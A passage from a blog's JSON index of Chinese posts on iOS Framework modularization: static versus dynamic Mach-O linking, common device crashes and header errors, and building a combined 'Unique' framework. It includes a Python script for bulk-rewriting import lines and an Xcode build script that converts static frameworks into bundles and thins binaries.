N代表要读取的长度","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Shell","slug":"Shell","permalink":"http://yoursite.com/tags/Shell/"},{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"},{"name":"Xcode","slug":"Xcode","permalink":"http://yoursite.com/tags/Xcode/"},{"name":"Compiler","slug":"Compiler","permalink":"http://yoursite.com/tags/Compiler/"}]},{"title":"模块化与Framework(23)：StaticLib混合引用测试","date":"2017-07-22T15:00:00.000Z","path":"2017/07/23/模块化23Framework与StaticLib混合引用测试/","text":"两个Framework/Executable 引用了共同Static Mach-O这里包含了Static Framework 和 Static Lib 两种含义 可能会带来以下问题 问题 原因 体积增大 静态的Static Mach-O 重复进入了Framework 和 Executable 类名重复 静态Static Mach-O 的类，在运行时同时存在于两个符号表 12Class SharedLib is implemented in both......One of the two will be used. Which one is undefined. 两个Framework/Executable 引用了共同Dynamic Mach-O如果将 SharedLib.a 更改为默认的Dynamic Mach-O SharedLib.framework，就不会出现以上的问题 原因是由于 Dynamic Framework不会加入自己所依赖的Framework的符号表，仅仅会把类名以 Undefined 形式加入 但是需要在最终的 Target.app中同样将 SharedLib.framework 加入才能正常使用Target.app 注意： 这里使用的词是正常使用，即使不添加 SharedLib.framework 也可以让Target.app Build Success 但是真机会抛出 运行时找不到错误 两个Static Lib 引用共同的Framework两个Static Lib引用共同的Framework的也不会有任何问题，原因在于 Static Mach-O 仅仅是 .o 文件的集合，而Framework已经是 Final File了，不会再进入一个 .o 集合 但是需要在最终的 Target.app中加入 Framework 加入才能正常使用Target.app","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"},{"name":"Xcode","slug":"Xcode","permalink":"http://yoursite.com/tags/Xcode/"},{"name":"Compiler","slug":"Compiler","permalink":"http://yoursite.com/tags/Compiler/"},{"name":"Framework","slug":"Framework","permalink":"http://yoursite.com/tags/Framework/"}]},{"title":"模块化与Framework(22)：常见真机调试崩溃Crash","date":"2017-07-21T15:00:00.000Z","path":"2017/07/22/模块化22Framework与常见真机崩溃Crash/","text":"模拟器不报错真机报错有些情况下，由于Xcode的工作机制，会给人对Embedded配置带来一些困扰，比如在同一个Workspace中同时存在 12345Playground.workspace -----Playground.xcodeproj -----Alpha.xcodeproj -----Beta.xcodeproj -----SharedLib.xcodeproj 如果此时我在 Playground.app的Target中仅仅配置 Alpha.framework 和 Beta.framework 在使用模拟器运行时不会出错，但是真机运行会报错 1dyld: Library not loaded: @rpath&#x2F;SharedLib.framework&#x2F;SharedLib 模拟器不报错原因是由于： 在模拟器的情况下存在一个Build目录 Xcode会将 Playground.app自身用到的Framework和 Framework所用到的Framework都Build一遍，放入这个工作目录 所以模拟器在启动后的动态加载SharedLib.framework的过程中，可以找到SharedLib.framework 例如 1&#x2F;Users&#x2F;XXXXX&#x2F;Library&#x2F;Developer&#x2F;Xcode&#x2F;DerivedData&#x2F;Playground-gcaboylfavdygfdrsxaefouaxqcy&#x2F;Build&#x2F;Products&#x2F;Debug-iphonesimulator&#x2F;SharedLib.framework 而真机报错的原因在于 真机不存在一个公用的Build目录 真机使用的是 Playgorund.app 的包目录内的Framework 根据Framework的配置原理 Playground.app需要一步拷贝Framework的过程 没有Embed SharedLib.framework，则不会拷贝至App的包目录 由于framework是运行后加载，Build成功后，运行中找不到所需文件，抛出运行时错误 包目录一般存在于 1&#x2F;Users&#x2F;XXXXX&#x2F;Library&#x2F;Developer&#x2F;Xcode&#x2F;DerivedData&#x2F;Playground-gcaboylfavdygfdrsxaefouaxqcy&#x2F;Build&#x2F;Products&#x2F;Debug-iphoneos&#x2F;Playground.app&#x2F;Frameworks 未知的 Mach-O header会出现在两种情况，需要检查那个Static Framework的Mach-O文件在伪装成Bundle时没有删除 Debug时的日志输出 Archive时无法导出 121. unknown file type, first eight bytes: 0x21 0x3C 0x61 0x72 0x63 0x68 0x3E 0x0A2. Found an unexpected Mach-O header code: 0x72613c21 其中 0x72613c21 是 x86 架构下的 Static Framework的文件头4个字节，可以使用命令行查看 1od -H -A n -N 8 static.framework&#x2F;static Library not found for -lswiftSwiftOnoneSupport这个错误代表着工程里没有Swift的基本库，一般在加入Swift代码时会Xcode会帮你自动添加，但是如果使用了 Static Framework，就不会执行这一步 12Library not found for -lswiftSwiftOnoneSupport for architecture arm64 解决方案： Target.app 里随便新建一个Swift文件，并且写一个函数 Swift 静态编译在Xcode 9.1 之前， Swift是不支持编译成 Static Mach-O问文件的，改用更高的版本即可 12CompileSwiftSources normal armv7 com.apple.xcode.tools.swift.compilerCompileSwift normal armv7 Unexpected CFBundleExecutable Key这个问题很常见，就是plist里的key值和实际的Bundle不符合，在伪装Bundle里有 defaults delete “../Info.plist” CFBundleExecutable 来删除，出现说明脚本有问题 12ERROR ITMS-90535: &quot;Unexpected CFBundleExecutable Key. The bundle at &#39;Payload&#x2F;StaticFramework.bundle&#39; does not contain a bundle executable. If this bundle intentionally does not contain an executable, consider removing the CFBundleExecutable key from its Info.plist and using a CFBundlePackageType of BNDL. If this bundle is part of a third-party framework, consider contacting the developer of the framework for an update to address this issue.&quot;","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"},{"name":"Xcode","slug":"Xcode","permalink":"http://yoursite.com/tags/Xcode/"},{"name":"Compiler","slug":"Compiler","permalink":"http://yoursite.com/tags/Compiler/"},{"name":"Framework","slug":"Framework","permalink":"http://yoursite.com/tags/Framework/"}]},{"title":"模块化与Framework(21)：引用非Framework模块Include of non-modular header","date":"2017-07-20T15:00:00.000Z","path":"2017/07/21/模块化21Framework与模块外nonmodular头文件/","text":"Include of non-modular header inside framework module在进行Framework化的过程中，一旦引用了某些Framework其使用者Project，就会报错 123HttpHelper.h:10:9: error : include of non-modular header inside framework module &#39;Ware.HttpHelper&#39;: &#39;&#x2F;Applications&#x2F;Xcode.app&#x2F;Contents&#x2F;Developer&#x2F;Platforms&#x2F;iPhoneSimulator.platform&#x2F;Developer&#x2F;SDKs&#x2F;iPhoneSimulator10.3.sdk&#x2F;usr&#x2F;include&#x2F;CommonCrypto&#x2F;CommonHMAC.h&#39;[-Werror,-Wnon-modular-include-in-framework-module] #import &lt;CommonCrypto&#x2F;CommonHMAC.h&gt; 提醒你 在Framework Module中加载了非当前Module的头文件 处理方法处理方法有两种，一种是基于LLVM的配置，一种是手动梳理头文件 Allow Non-modular Include根据StackOverflow的回答可以通过 Build Setting — Apple LLVM 8.1 Language Modules — Allow Non-modular Includes In Framework Modules 设置为YES，则可以在Framework中使用模块外的Include，不过这种过于粗暴 检查头文件引用关系根据下文产生原因的分析，其本质原因类似C++文件file not found的加载与编译，是因为不同语言之间的头文件引用混乱产生的 手工检查头文件引用关系，特别是 Umbrella Header File中 不要引用Include 了 C/C++ 头文件的OC头文件 作为子模块放出 产生原因关注点集中于 #import &lt;CommonCrypto/CommonHMAC.h&gt; 可以发现其 CommonCrypto 模块为一个系统库 与UIKit这样的Framework不同，CommonCrypto 是 C模块 ，也就是说其头文件 CommonHMAC.h 不应该伴随 SomeHeader.h 头文件对外暴露 Target.app 引用了 SharedFrame.framework的Umbrella头文件 SharedFrame.h Umbrella头文件中包含了 SomeHeader.h HttpHelper.h 中暴露了 CommonCrypto 的 CommonHMAC.h 对于 SharedFrame.framework的Scope， 内部二进制包含有 CommonCrypto 模块的代码，CommonHMAC.h有效 对于 Target.app的Scope， 不确定SharedFrame.h内部引用 HttpHelper.h 是否包含CommonCrypto 模块的代码 Target.app 判定 &lt;CommonCrypto/CommonHMAC.h&gt; 为模块外Header File报错 修改方法: 在 SharedFrame.h 中删除 #import &lt;SharedFrame/HttpHelper.h&gt;, 仅在 Target.app 的.m文件中使用时加载","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"},{"name":"Xcode","slug":"Xcode","permalink":"http://yoursite.com/tags/Xcode/"},{"name":"Compiler","slug":"Compiler","permalink":"http://yoursite.com/tags/Compiler/"},{"name":"Framework","slug":"Framework","permalink":"http://yoursite.com/tags/Framework/"}]},{"title":"模块化与Framework(20)：C++头文件和C文件错误解析","date":"2017-07-19T15:00:00.000Z","path":"2017/07/20/模块化20Framework与C++头文件和C文件错误解析/","text":"‘iostream’ file not found大部分出现在OC和C++混编的时候，根据StackOverflow的回答多数提到了三点 更改 Build Setting 里的 C++ Standard Library 或 C++ Language Dialect(无效) 更改 Build Setting 里的 Compile Source As 为 Object-C++(有效) 引用文件改为.mm (有效) 其中真正解决问题的是第二和第三种方式，但是它们都没有指出问题的根源 头文件的引用无序，导致以Objective-C进行Compile的文件引用了C++的头文件 Compile Source As更改这个选项为 Object-C++ 是把任何源文件都以C++和Object-C混编的方式进行Compile 但是不推荐使用这个方法，是因为会带来一系列的编译器语法检查问题，例如 1234567&#x2F;&#x2F;Object-C 可以通过CGPoint *point &#x3D; malloc(sizeof(CGPoint)*10);&#x2F;&#x2F;Object-C++需要强制转换一次CGPoint *point &#x3D; (CGPoint *)malloc(sizeof(CGPoint)*10);&#x2F;&#x2F;Error信息.....Cannot initialize a variable of type &#39;CGPoint *&#39; with an rvalue of type &#39;void *&#39; 引用文件改为.mm当时候 .mm 作为后缀名时，该文件会自动使用C++的Compile进行编译 头文件引用混乱报错假设存在以下文件——Cplus.h——Cplus.mm——OCNormal.h——OCNormal.m 12345&#x2F;&#x2F;Cplus.h#include &lt;iostream&gt;&#x2F;&#x2F;OCNormal.h#import &quot;Cplus.h&quot; 正常情况下 Cplus.mm作为Object-C++编译，可以正确引用 Cplus.h 中的 不报错 OCNormal.m作为Object-C编译，引用了OCNormal.h，其中OCNormal.h由于引用了Cplus.h，引入了 所以在以上情况下，OCNormal这个Object-C文件错误加载了C++的头文件，导致 Cplus.h中的 报错 经常出现在，Framework中的部分功能是由C++提供的，但是在umbrella的头文件中加入了C++的头文件，外部工程直接引用umbrellato头文件报错 CocoaPods 与 Swift 使用C模块在解决C模块引用的时候查询到 modulemap的知识，很多人用于解决 CocoaPods和Swift Framework里解决C模块引用 私有库之间的C模块隐藏 不过感觉这两个答案都是没管理好头文件暴露导致的，没有仔细看","tags":[{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"},{"name":"Xcode","slug":"Xcode","permalink":"http://yoursite.com/tags/Xcode/"},{"name":"Compiler","slug":"Compiler","permalink":"http://yoursite.com/tags/Compiler/"},{"name":"Framework","slug":"Framework","permalink":"http://yoursite.com/tags/Framework/"}]},{"title":"模块化与Framework(19)：常见的头文件问题","date":"2017-07-18T15:00:00.000Z","path":"2017/07/19/模块化19Framework与常见的头文件问题/","text":"错误追踪产生任何头文件错误的时候，虽然错误定位会在引入C++头文件的文件中，但是具体是通过那种嵌套关系导致的，可以在 Show the Report Navigator 中找到详细的引用关系 ‘iostream’ file not found大部分出现在OC和C++混编的时候，头文件的引用无序，导致以Objective-C进行Compile的文件引用了C++的头文件 经常出现在，Framework中的部分功能是由C++提供的，但是在umbrella的头文件中加入了C++的头文件，外部工程直接引用umbrellato头文件报错 详细可以查看后文C++头文件错误解析 Include of non-modular header inside framework module在进行Framework化的过程中，一旦引用了某些Framework其使用者Project，就会报错 1HttpHelper.h:10:9: error : include of non-modular header inside framework module ...#import &lt;CommonCrypto&#x2F;CommonHMAC.h&gt; 一般情况是Framework中umbrella的头文件中加入了某个的头文件引用了外部模块的头文件 例如上文的 CommonHMAC.h 详细分析见模块外头文件non-modular Framework 内部 Swift和OC互相调用 调用 问题 方案 OC use Swift #import “Framework-Swift.h” 错误 改用 &lt;Framework/Framework-Swift.h&gt; Swift use OC Swift如何引用Bridging文件，加载OC代码 将 Bridging文件加入 Umbrella Header 由于 Framework/Framework-Swift.h 文件是在Framework编译完成后自动生成的，所以使用“双引号”加载该文件必然找不到 而这又会引起另外一个问题 Umbrella文件内加载的头文件Some.h，Some.h内不能加载 Framework/Framework-Swift.h，也就是说使用Swift的OC头文件，不能进入Umbrella 因为Umbrella会优先于一切编译进行预编译，然后此时不管“双引号” “尖括号”路径下都不存在该文件，所以会报错","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"},{"name":"Xcode","slug":"Xcode","permalink":"http://yoursite.com/tags/Xcode/"},{"name":"Compiler","slug":"Compiler","permalink":"http://yoursite.com/tags/Compiler/"},{"name":"Framework","slug":"Framework","permalink":"http://yoursite.com/tags/Framework/"}]},{"title":"模块化与Framework(18)：头文件批量更改","date":"2017-07-17T15:00:00.000Z","path":"2017/07/18/模块化18Framework与头文件批量更改/","text":"头文件的问题在完成了全部工程的Framework化之后，存在一个问题就是要改变文件的加载形式 123#import &quot;someheader.h&quot; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt; #import &lt;framework&#x2F;someheader.h&gt; 对于比较大的工程，是个很麻烦的事情，所以写了个脚本 frameworkPath：编译好的 .framework 文件 projectPath： 要更改的工程目录 第一个参数为 framework的路径 第二个参数为 project的路径 脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100#!&#x2F;usr&#x2F;bin&#x2F;python# Prepare Modulefrom os import listdirfrom os.path import isfile, joinfrom sys import argv# Prepare Global VariousprojectPath &#x3D; &quot;.&#x2F;Project&quot;frameworkPath &#x3D; &quot;.&#x2F;Frameworks&quot;frameDict &#x3D; &#123;&#125;duplicateDict &#x3D; &#123;&#125;# Phase One: Create A File:Frameworks Dictionarydef framework_by_path(path): index_begin &#x3D; path.find(frameworkPath) + len(frameworkPath) + 1 index_end &#x3D; path.find(&#39;.framework&#x2F;&#39;, index_begin) return path[index_begin:index_end]def process_duplicate_file(file, framework): array &#x3D; [framework] if file in duplicateDict: array.extend(duplicateDict[file]) else: frameDict[file] &#x3D; &quot;Duplicate&quot; duplicateDict[file] &#x3D; arraydef process_head_file(file, framework): if file.find(&quot;.h&quot;) &#x3D;&#x3D; -1: return if file in frameDict: process_duplicate_file(file, framework) return frameDict[file] &#x3D; frameworkdef read_file_dict(path): for file in listdir(path): file_path &#x3D; join(path, file) if isfile(file_path): process_head_file(file, framework_by_path(file_path)) else: read_file_dict(file_path)# Phase Two: Process Projectdef process_line(line, changed): if &#39;#import \\&quot;&#39; in line: end &#x3D; line.find(&#39;\\&quot;&#39;, 9) file &#x3D; line[9:end] if file in frameDict: line &#x3D; &#39;#import &lt;&#39; + frameDict[file] + &#39;&#x2F;&#39; + file + &#39;&gt;\\n&#39; changed.append(line) return linedef process_file(file): changed &#x3D; [] lines &#x3D; file.readlines() lines_write &#x3D; [] for line in lines: lines_write.append(process_line(line, changed)) print(&quot;In File &quot;, file, &quot;need Replace&quot;, changed) return lines_writedef process_code_file(path): if path.find(&quot;.m&quot;) &#x3D;&#x3D; -1 and path.find(&quot;.h&quot;) &#x3D;&#x3D; -1: return file_read &#x3D; open(path, &quot;r+&quot;) lines &#x3D; process_file(file_read) file_read.close() file_write &#x3D; open(path, &quot;w+&quot;) file_write.writelines(lines) file_write.close()def read_project(path): for file in listdir(path): file_path &#x3D; join(path, file) if isfile(file_path): process_code_file(file_path) else: read_project(file_path)if len(argv) &#x3D;&#x3D; 3: frameworkPath &#x3D; argv[1] projectPath &#x3D; argv[2]read_file_dict(frameworkPath)read_project(projectPath)","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"},{"name":"Xcode","slug":"Xcode","permalink":"http://yoursite.com/tags/Xcode/"},{"name":"Compiler","slug":"Compiler","permalink":"http://yoursite.com/tags/Compiler/"},{"name":"Framework","slug":"Framework","permalink":"http://yoursite.com/tags/Framework/"}]},{"title":"模块化与Framework(17)：StaticFramework伪装Bundle","date":"2017-07-16T15:00:00.000Z","path":"2017/07/17/模块化17Framework与StaticFramework伪装Bundle/","text":"伪装所需要的操作Static Framework 需要伪装成Bundle主要是为了避免以下问题 Static Framework内的Mach-O无用 Static Framework Debug时会报错 Static Framework 简单删除Mach-O会引起无法Archive 和 安装等问题 所需要 操作 作用 删除Static Framework Mach-O 因为Static Mach-O会进入动态库和App，原本Framework的.o的压缩包变得无用 取消代码签名 Bundle本身是不需要签名的 修改Plist 将Framework变身成Bundle 移除Frameworks目录 如果不移除Frameworks目录，会无法Install在设备上，签名验证失败 在完成伪装后需要通过 [NSBundle bundleWithURL:] 来进行加载，不能使用[self class]加载 Shell脚本主要指令 命令行 作用 执行 defaults 读写Plist文件，将Framework改Bundle defaults write “$FRAMEWORK/Info.plist” CFBundlePackageType “BNDL” defaults delete “$FRAMEWORK/Info.plist” CFBundleExecutable otool 查看Mach-O，判断是否为Static otool -a “$FRAMEWORK_EXECUTABLE_PATH head 选取第一行 head -n 1 其余的命令可以去参考文章模块化中的Shell Example Shell以下是个完整版的包含了 Static Framework 改 Bundle 删除无用的Framework 架构的脚本 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455APP_PATH&#x3D;&quot;$&#123;TARGET_BUILD_DIR&#125;&#x2F;$&#123;WRAPPER_NAME&#125;&quot;find &quot;$APP_PATH&quot; -name &#39;*.framework&#39; -type d | while read -r FRAMEWORKdoFRAMEWORK_EXECUTABLE_NAME&#x3D;$(defaults read &quot;$FRAMEWORK&#x2F;Info.plist&quot; CFBundleExecutable)FRAMEWORK_EXECUTABLE_PATH&#x3D;&quot;$FRAMEWORK&#x2F;$FRAMEWORK_EXECUTABLE_NAME&quot;BUNDLE_IN_ROOT&#x3D;&quot;$APP_PATH&#x2F;$&#123;FRAMEWORK_EXECUTABLE_NAME&#125;.bundle&quot;if [[ -e &quot;$FRAMEWORK_EXECUTABLE_PATH&quot; ]]; then FRAMEWORK_MACH_O&#x3D;&quot;$(otool -a &quot;$FRAMEWORK_EXECUTABLE_PATH&quot; | head -n 1)&quot; FRAMEWORK_FAT_ARCH&#x3D;&quot;$(lipo -info &quot;$FRAMEWORK_EXECUTABLE_PATH&quot;)&quot;else FRAMEWORK_MACH_O&#x3D;&quot;NO EXIST&quot; FRAMEWORK_FAT_ARCH&#x3D;&quot;NO EXIST&quot;fiecho &quot;FRAMEWORK_EXECUTABLE_NAME is $FRAMEWORK_EXECUTABLE_NAME&quot;echo &quot;FRAMEWORK_EXECUTABLE_PATH is $FRAMEWORK_EXECUTABLE_PATH&quot;echo &quot;FRAMEWORK_MACH_O is $FRAMEWORK_MACH_O&quot;echo &quot;FRAMEWORK_FAT_ARCH is $FRAMEWORK_FAT_ARCH&quot;echo &quot;BUNDLE_IN_ROOT is $BUNDLE_IN_ROOT&quot;if [[ &quot;$FRAMEWORK_MACH_O&quot; &#x3D;~ &quot;Archive :&quot; ]]; then echo &quot;Rmove Static-Mach-O is $FRAMEWORK_EXECUTABLE_PATH&quot; rm &quot;$FRAMEWORK_EXECUTABLE_PATH&quot; defaults write &quot;$FRAMEWORK&#x2F;Info.plist&quot; CFBundlePackageType &quot;BNDL&quot; defaults delete &quot;$FRAMEWORK&#x2F;Info.plist&quot; CFBundleExecutable if [[ -d &quot;$BUNDLE_IN_ROOT&quot; ]]; then rm -rf &quot;$BUNDLE_IN_ROOT&quot; fi mv -f &quot;$FRAMEWORK&quot; &quot;$BUNDLE_IN_ROOT&quot;elif [[ &quot;$FRAMEWORK_FAT_ARCH&quot; &#x3D;~ &quot;Architectures in the fat file&quot; ]]; then #statements EXTRACTED_ARCHS&#x3D;() for ARCH in $ARCHS do echo &quot;Extracting $ARCH from $FRAMEWORK_EXECUTABLE_NAME&quot; lipo -extract &quot;$ARCH&quot; &quot;$FRAMEWORK_EXECUTABLE_PATH&quot; -o &quot;$FRAMEWORK_EXECUTABLE_PATH-$ARCH&quot; EXTRACTED_ARCHS+&#x3D;(&quot;$FRAMEWORK_EXECUTABLE_PATH-$ARCH&quot;) done echo &quot;Merging extracted architectures: $&#123;ARCHS&#125;&quot; lipo -o &quot;$FRAMEWORK_EXECUTABLE_PATH-merged&quot; -create &quot;$&#123;EXTRACTED_ARCHS[@]&#125;&quot; rm &quot;$&#123;EXTRACTED_ARCHS[@]&#125;&quot; echo &quot;Replacing original executable with thinned version&quot; rm &quot;$FRAMEWORK_EXECUTABLE_PATH&quot; mv &quot;$FRAMEWORK_EXECUTABLE_PATH-merged&quot; &quot;$FRAMEWORK_EXECUTABLE_PATH&quot;fidone","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"},{"name":"Xcode","slug":"Xcode","permalink":"http://yoursite.com/tags/Xcode/"},{"name":"Compiler","slug":"Compiler","permalink":"http://yoursite.com/tags/Compiler/"},{"name":"Framework","slug":"Framework","permalink":"http://yoursite.com/tags/Framework/"}]},{"title":"模块化与Framework(16)：Unique Framework制作步骤","date":"2017-07-15T15:00:00.000Z","path":"2017/07/16/模块化16Framework与UniqueFramework制作步骤/","text":"头文件系统根据设计方案 Alpha内的文件需要随同Unique向外公开 Beta为内部使用，不需要对外公开 那么首选处理Alpha和Beta的头文件 Alpha头文件-Public由于Alpha的头文件需要同Unique一样对外Public (不推荐，如果需要Public，为何不将代码直接放入Unique) 但是有些特殊情况需要兼顾，于是需要做出如下处理 操作 作用 拖动Alpha的需要Public的头文件，进入Unique Project，不勾选Copy If Need 使得Unique Project与Alpha Project的头文件在磁盘上是同一个文件 将Alpha头文件在UniqueProject工程中也对外公开 让用户使用UniqueFramework也可以通过尖括号加载 将Alpha的头文件路径加入 Unique 的 Header Search Path 让Unique Framework可以引用到 Alpha中任何头文件 将Alpha的头文件，加入Unique 的 Umbrella Framework 让用户可以正常使用Alpha的公开类 Alpha的Public的头文件进入Unique Project Alpha的头文件路径加入 Unique 的 Header Search Path 对比Alpha和Unique的头文件的不同 Beta头文件-Private(多数情况)Beta的头文件因为不对外做任何暴露，所以不需要任何操作，仅需按照Framework的方式在Unique的 .m 中通过尖括号加载 但是注意仅可以在 .m文件中使用，不可以在.h 对外暴露 Mach-O的合并根据文章静态编译StaticFramework的介绍，如果想让可执行文件合并，仅需将 Alpha 和 Beta 的Mach-O类型改为Static 选择性 Link 过程但是值得注意的是在Link的过程中，存在对 .o 文件的选择性 如果在Unique中没有使用过的符号，不会被Load进入Mach-O Alpha的使用 是否会被Load Unique Umbrella Header中加载Alpha头文件 No Load Unique 普通.h中加载Alpha头文件，声明变量，但不实例化 No Load Unique 普通.m中加载Alpha头文件，声明变量，但不实例化 No Load Unique 普通.m中加载Alpha头文件，声明变量，进行实例化 Load 所以结论是 如果想暴露Alpha的符号给外部使用，必须在Unique里进行实例化，才会融合入Unique Mach-O 修改Load方式除了小心翼翼的实例化之外，还可以通过修改 Other Linker Flags来避免漏掉 OC的符号 1-ObjC: 在Link 的过程中，加载所有的OC符号 资源文件处理而资源文件的处理则可以分为两种方式 | 资源处理方法 | 解释 | 备注 || :————- | :————- || Disk路径引入式 | 如同Alpha的头文件一样，加入到Unique Framework的Compile过程 | 更推荐这种构建Unique Framework || 伪装成Bundle | 将Sub Framework Embed进Unique，并在编译完成后伪装成Bundle | 在App引入Static Framework时更省心 | Disk路径引入直接将 Sub Framework的 Media.xcassets 文件夹加入Unique Project 不勾选Copy If Need 然后检查 Unique Framework的 Build Phase————Copy Bundle Resource 是否包含了地盘路径的xcassets文件 伪装成Bundle根据Mach-O文件的类型我们可以得知，Bundle 和 Framework 都是动态库，Bundle只是不能被Link而已 和Unique Framework不同，App的 Embed 过程会将 Framework拷贝进入 Target.app/Frameworks 文件夹 在Framework采用了Static Mach-O后，我们采用脚本伪装成一个Bundle，并且可以删除掉无用的静态Mach-O文件 可以参考后续文章","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"},{"name":"Xcode","slug":"Xcode","permalink":"http://yoursite.com/tags/Xcode/"},{"name":"Compiler","slug":"Compiler","permalink":"http://yoursite.com/tags/Compiler/"},{"name":"Framework","slug":"Framework","permalink":"http://yoursite.com/tags/Framework/"}]},{"title":"模块化与Framework(15)：特殊的Unique Framework","date":"2017-07-14T15:00:00.000Z","path":"2017/07/15/模块化15Framework与特殊的UniqueFramework/","text":"Umbrella OR Unique根据上文描述，在Mac OS中有Umbrella Framework的概念，但是在iOS中这个概念不再被苹果提及 本文将整理如何实现同Umbrella Framework一样效果的Unique Framework来完成一些特殊的需求 Unique Framework的关键点 根据文章Framework的多版本和Umbrella介绍，目前StackOverflow上的所有答案均为错误 制作Unique Framework的所有代码必须本人可控，不能依赖第三方库 Unique Framework的拆解根据上文介绍，Framework一共可以分为三个部分 模块 作用 Unique化方案 头文件系统 根据modulemap进行头文件管理 通过Disk Path 和 Search Path引入，并加入Umbrella Mach-O 可执行文件 通过设置依赖的Framework为Static Mach-O，让其加入Unique Mach-O 资源文件 资源压缩包 通过Disk Path引入，伪装成Bundle 我们后续文章将会对如下架构进行Unique Framework教学 :image01 Unique Framework 无法避免的重复类(按照上述方法应该不会出现)直接把需要暴露的类拷贝到 Unique Framework中，直接使用，很多人会疑问不会出现 Duplicated Symbols 的错误么？ 答案是不会，仅仅会在运行时丢出一个错误 12345Class PLBuildVersio is implemented in both ..................One of the two will be used. Which one is undefined. 这种处理方法，在苹果的 PhotoLibraryServices.framework 和 AssetsLibraryServices.framework 中 PLBuildVersio 就使用到了 虽然比较粗暴，但是也不会有任何问题，唯一需要保证的是，两处的实现一定要一致 具体讨论可以查看 Class PLBuildVersion is implemented in both frameworks","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"},{"name":"Xcode","slug":"Xcode","permalink":"http://yoursite.com/tags/Xcode/"},{"name":"Compiler","slug":"Compiler","permalink":"http://yoursite.com/tags/Compiler/"},{"name":"Framework","slug":"Framework","permalink":"http://yoursite.com/tags/Framework/"}]},{"title":"模块化与Framework(14)：静态编译Static Framework","date":"2017-07-13T15:00:00.000Z","path":"2017/07/14/模块化14Framework与静态编译StaticFramework/","text":"Static Mach-O Framework先说结论，修改Build Setting——Linking——Match-O Type，来决定以什么样的命令处理Target 将 .framework的 Match-O Type改为 StaticLibrary 即得到 Mach-O为 StaticLib 的framework文件, 即可执行文件为 .o 的压缩包 会引发的问题Framework无法被Load引发资源读取问题因为使用了静态Mach-O，就不能使用 [self class]来读取自身的Bundle，必须用path的方式读取，例如 1NSString *path &#x3D; [[[NSBundle mainBundle] bundlePath] stringByAppendingString:@&quot;&#x2F;Frameworks&#x2F;staic.framework&quot;] 无用的可执行文件根据文章Link与符号表的关系，在Target.app情况下， Static Mach-O Framework的代码会进入 Target.app 但是又因为Copy Framework的原因,Framework会被拷贝进入Frameworks文件夹 也就是说 二进制存在的Mach-O 来源 Mach O类型 Target.app/Target 在Link过程中，Link进入App本身的Mach-O中一份 Executable，连续地址的Mach O Target.app/Frameworks/static.framework/statict Static Framework本身的Mach-O Static，.o文件的压缩包，不可以被执行 其中Frameworks下的Static Mach-O中 .o 压缩包 是一个无用的文件 符号表的问题由于更改了Mach-O，那么当前Product生成的framework中的文件，相当于一个StaticLib，.o文件的压缩包 其它Mach-O Link到 Static.framework根据测试，其Mach-O就是一个普通的静态库， Link Component To Module Explain Enter OR Not Same As To StaticLib StaticLib.a Static.framework 静态库–&gt;静态库 Enter Same Dynamic.framework Static.framework 动态库–&gt;静态库 Not Same Static.framework Link到其它Mach-O我们发现静态的Framework在Link到其它Mach-O时 和单纯的StaticLib有差别 Link Component To Module Explain Enter OR Not Result Mach-O Backup Same As StaticLib Static.framework Static.framework 静态Framework–&gt;静态Framework Not StaticLibrary+StaticLibrary 因为-framework参数，倒是不会合并.o压缩包 Different Static.framework StaticLib.a 静态Framework–&gt;静态库 Not StaticLibrary+StaticLibrary 也是因为-framework参数 Different Static.framework Dynamic.framework 静态Framework–&gt;动态库 Enter DynamicLibrary 会进入动态库，但是如果动态库里没有使用到，就会被Strip掉 Same Static.framework App 静态Framework–&gt;App Enter Executable 静态库的代码进入了App，组成了可执行文件 Same 可以发现区别在于 当Static.framework连接到 静态的Mach-O(包含静态库和静态Framework) 时，并不会和Static.lib 一样把 .o文件进入到目标的Mach-O 原因在于Create StaticLib的过程中命令行的参数不同，所以 在-framework参数下的 .o 文件并不会进入目标的 Mach-O 1234567891011&#x2F;&#x2F; 1. Link StaticLib...XcodeDefault.xctoolchain&#x2F;usr&#x2F;bin&#x2F;libtool -static......-lStaticLib &lt;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;使用的 -l 参数&#x2F;&#x2F; 1. Link StaticFramework...XcodeDefault.xctoolchain&#x2F;usr&#x2F;bin&#x2F;libtool -static......-framework StaticFrame &lt;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;使用的-framework参数 根据libtool命令行的解释 -framework参数来自 ld 命令，其关于Libraries中对动态库描述如下 12345A static library (aka static archive) is a collection of .o files with a table of contents that lists the global symbols in the .o files. Exported symbols from the dynamic library are used to resolve 